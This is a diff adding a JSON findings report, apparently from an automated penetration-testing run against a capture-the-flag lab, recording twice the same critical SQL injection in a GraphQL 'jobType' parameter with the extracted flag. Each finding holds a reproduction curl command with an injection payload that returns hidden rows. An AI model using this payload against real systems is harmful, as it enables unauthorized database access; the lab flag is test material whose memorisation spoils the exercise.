@@ -1,0 +1,41 @@
+{
+  "meta": {
+    "created": "2026-04-14T23:38:09.576176+00:00",
+    "target": ""
+  },
+  "findings": [
+    {
+      "id": "56b77f56-fffe-427d-93ee-3f157c8e24d1",
+      "timestamp": "2026-04-14T23:38:09.576068+00:00",
+      "title": "GraphQL SQL Injection - Flag Extracted",
+      "severity": "critical",
+      "target": "http://172.17.0.1:35851/graphql/",
+      "description": "SQL injection vulnerability in the jobType parameter of the GraphQL endpoint. The parameter value is directly interpolated into SQL queries without sanitization, allowing an attacker to extract hidden data from the database.",
+      "evidence": "flag{3c8f1e0c-ed42-4e5f-a038-61d9c40b9fc9}",
+      "tool_used": "http",
+      "cve": "",
+      "reproduction": {
+        "type": "http",
+        "command": "curl -X POST http://172.17.0.1:35851/graphql/ -H 'Content-Type: application/json' -d '{\"query\": \"{ jobs(jobType: \"\\\" OR 1=1--\") { id name type description } }\"}'",
+        "expected": "Response includes hidden job with flag in description field"
+      }
+    },
+    {
+      "id": "ecb3ab4d-9f3c-4fa0-bd2a-ce76db9d6f08",
+      "timestamp": "2026-04-14T23:38:09.737405+00:00",
+      "title": "GraphQL SQL Injection - Flag Extracted",
+      "severity": "critical",
+      "target": "http://172.17.0.1:35851/graphql/",
+      "description": "SQL injection vulnerability in the jobType parameter of the GraphQL endpoint. The parameter value is directly interpolated into SQL queries without sanitization, allowing an attacker to extract hidden data from the database.",
+      "evidence": "flag{3c8f1e0c-ed42-4e5f-a038-61d9c40b9fc9}",
+      "tool_used": "http",
+      "cve": "",
+      "reproduction": {
+        "type": "http",
+        "command": "curl -X POST http://172.17.0.1:35851/graphql/ -H 'Content-Type: application/json' -d '{\"query\": \"{ jobs(jobType: \"\\\" OR 1=1--\") { id name type description } }\"}'",
+        "expected": "Response includes hidden job with flag in description field"
+      }
+    }
+  ],
+  "diagrams": []
+}
